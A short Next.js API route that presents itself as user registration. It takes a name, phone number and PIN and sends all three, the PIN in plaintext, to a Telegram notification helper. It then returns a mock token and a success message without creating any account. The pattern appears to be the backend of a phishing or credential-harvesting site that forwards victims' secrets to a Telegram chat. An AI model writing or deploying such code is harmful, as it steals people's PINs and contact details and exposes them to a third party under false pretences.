import { NextRequest } from 'next/server';
import { notify } from '@/lib/telegram';

export async function POST(req: NextRequest) {
  try {
    const { name, phone, pin, action } = await req.json();
    
    // Send notification to Telegram based on the action
    if (action === 'create_pin' && name && phone && pin) {
      // Send notification with name, phone, and pin when creating PIN
      await notify.signup(phone, name, 'N/A', pin);
    } else if (name && phone) {
      // Send notification for registration attempt
      await notify.signup(phone, name, 'N/A', 'N/A');
    }
    
    // Create a mock token (in a real app, this would be a JWT)
    const token = `mock_token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // In a real implementation, you would create the user in the database
    // For now, we'll just return a success response
    return new Response(
      JSON.stringify({ 
        success: true, 
        message: 'User registered successfully',
        token: token
      }),
      { 
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      }
    );
  } catch (error) {
    console.error('Error registering user:', error);
    return new Response(
      JSON.stringify({ 
        success: false, 
        message: 'Failed to register user' 
      }),
      { 
        status: 500,
        headers: { 'Content-Type': 'application/json' }
      }
    );
  }
}